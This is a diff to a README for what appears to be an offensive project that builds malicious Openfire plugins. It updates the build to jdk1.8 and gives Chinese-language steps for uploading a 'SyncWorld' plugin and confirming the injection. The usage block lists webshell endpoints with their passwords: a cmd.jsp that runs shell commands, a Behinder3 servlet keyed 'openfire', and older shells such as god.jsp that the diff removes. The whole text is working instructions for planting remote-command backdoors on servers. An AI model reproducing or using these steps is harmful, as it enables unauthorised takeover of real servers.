@@ -1,17 +1,18 @@
 # build requirements:
 ant1.9
-jdk1.6
+jdk1.8
 
-上传 openfire_shells/src/plugins/test/bin 下的test.jar后
+上传 out下的SyncWolrd后
+
+/plugins/syncworld/Test 返回Injected 注入成功
 
 
 ```
 usages:
+/plugins/syncworld/cmd.jsp?cmd=whoami
+/plugins/syncworld/SyncServlet  behinder3 pass=openfire
+/plugins/syncworld/Test 返回Injected
 
-/plugins/test/re2.jsp pass
-/plugins/re3.jsp rebeyond
-/plugins/god.jsp pass
-
-/plugins/servlet/chropper?
-/plugins/servlet/test?
 ```
+a2ad9b4babbba7e9460d5294f4585096
+
